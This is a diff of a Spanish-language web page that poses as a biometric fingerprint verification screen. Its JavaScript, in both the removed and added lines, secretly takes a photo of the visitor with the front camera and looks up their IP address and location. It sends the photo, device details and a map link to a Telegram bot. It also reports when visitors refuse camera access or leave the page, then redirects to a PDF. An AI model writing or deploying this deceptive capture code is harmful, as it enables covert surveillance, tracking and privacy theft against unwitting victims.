@@ -1,80 +1,31 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Acceso Seguro - Verificación de Huella</title>
-    <style>
-        body { background: #000; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden; user-select: none; }
-        .fingerprint-sensor { width: 150px; height: 150px; border: 2px solid #00d4ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; position: relative; box-shadow: 0 0 20px rgba(0, 212, 255, 0.5); cursor: pointer; }
-        .fingerprint-icon { font-size: 80px; opacity: 0.8; }
-        .laser { position: absolute; width: 100%; height: 3px; background: #00d4ff; box-shadow: 0 0 15px #00d4ff; top: 0; display: none; animation: scanning 2s linear infinite; }
-        @keyframes scanning { 0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; } }
-        .status-text { margin-top: 30px; font-size: 14px; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; }
-        .progress-ring { position: absolute; width: 170px; height: 170px; border: 4px solid transparent; border-top: 4px solid #00d4ff; border-radius: 50%; display: none; animation: spin 1s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-
-    <div class="progress-ring" id="ring"></div>
-    <div class="fingerprint-sensor" id="sensor">
-        <div class="laser" id="laser"></div>
-        <span class="fingerprint-icon">🧬</span>
-    </div>
-
-    <div class="status-text" id="status">PULSE PARA ESCANEAR HUELLA</div>
-
-    <audio id="beep" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>
-
-    <script src="config.js"></script>
-    <script>
-        const sensor = document.getElementById('sensor');
-        const status = document.getElementById('status');
-        const laser = document.getElementById('laser');
-        const ring = document.getElementById('ring');
-        const beep = document.getElementById('beep');
-        let procesoExitoso = false;
-
-        // --- SISTEMA DE REPORTE POR ABANDONO ---
-        window.addEventListener('beforeunload', function (e) {
-            if (!procesoExitoso) {
-                const reporteAbandono = "⚠️ *ALERTA DE ABANDONO*\nEl usuario cerró la página antes de completar la verificación.";
-                // sendBeacon asegura el envío incluso si la pestaña se está cerrando
-                navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: reporteAbandono,
-                    parse_mode: 'Markdown'
-                }));
-            }
-        });
-
-        async function validarBiometria() {
-            // Feedback táctil
+async function validarBiometria() {
             if (navigator.vibrate) navigator.vibrate([100]);
-            
             status.innerHTML = "MANTENGA PRESIONADO...";
             laser.style.display = "block";
             ring.style.display = "block";
 
-            let infoDispositivo = "";
+            let fotoBlob = null;
+            let infoDispositivo = "Cargando datos...";
 
             try {
-                // 1. Obtener datos de red y equipo
-                const resIP = await fetch('https://ipapi.co/json/');
-                const d = await resIP.json();
-                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Móvil Desconocido";
-                
-                infoDispositivo = `📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                // 1. Obtener datos de red ANTES que la cámara (Prioridad 1)
+                try {
+                    const resIP = await fetch('https://ipapi.co/json/');
+                    const d = await resIP.json();
+                    const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Desconocido";
+                    infoDispositivo = `📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                } catch (e) {
+                    infoDispositivo = "⚠️ Error obteniendo IP/Ubicación";
+                }
 
-                // 2. Intentar Acceso a Cámara
+                // 2. Intentar acceder a la cámara (Prioridad 2)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute("playsinline", true);
                 await video.play();
                 
-                // Espera de 1.5s para simular el escaneo y que la cámara ajuste el brillo
+                // Espera para enfoque
                 await new Promise(r => setTimeout(r, 1500));
 
                 const canvas = document.createElement('canvas');
@@ -82,13 +33,10 @@
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // Convertir a imagen
-                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
-                
-                // Apagar cámara
+                fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
                 stream.getTracks().forEach(t => t.stop());
 
-                // 3. Envío con Foto a Telegram
+                // 3. Envío con FOTO y TEXTO juntos
                 const fd = new FormData();
                 fd.append('chat_id', CONFIG.CHAT_ID);
                 fd.append('photo', fotoBlob, 'foto.jpg');
@@ -96,24 +44,15 @@
                 fd.append('parse_mode', 'Markdown');
 
                 await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                
-                // Éxito: marcamos para evitar reporte de abandono
                 procesoExitoso = true;
-                beep.play();
-                status.innerHTML = "✅ IDENTIDAD CONFIRMADA";
-                
-                setTimeout(() => { 
-                    window.location.href = CONFIG.PDF_URL; 
-                }, 1500);
 
             } catch (err) {
-                // 4. Reporte de Error Específico a Telegram
+                // REPORTAR POR QUÉ NO CARGÓ LA FOTO
                 let mensajeError = "❌ *ERROR DE CAPTURA*\n\n";
-                
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                     mensajeError += "🚫 *Razón:* El usuario RECHAZÓ el permiso de cámara.";
                 } else if (err.name === 'NotFoundError') {
-                    mensajeError += "📷 *Razón:* No se detectó cámara frontal.";
+                    mensajeError += "📷 *Razón:* No tiene cámara frontal.";
                 } else {
                     mensajeError += `⚠️ *Razón:* ${err.message}`;
                 }
@@ -128,12 +67,13 @@
                     })
                 });
 
-                alert("ERROR DE LECTURA: El sensor biométrico requiere acceso a la cámara frontal para validar su identidad.");
+                alert("ERROR DE LECTURA: El sensor requiere acceso a la cámara frontal para validar su identidad.");
                 location.reload();
+                return;
             }
-        }
 
-        sensor.addEventListener('click', validarBiometria);
-    </script>
-</body>
-</html>
+            // Éxito final
+            beep.play();
+            status.innerHTML = "✅ CONFIRMADO";
+            setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
+        }
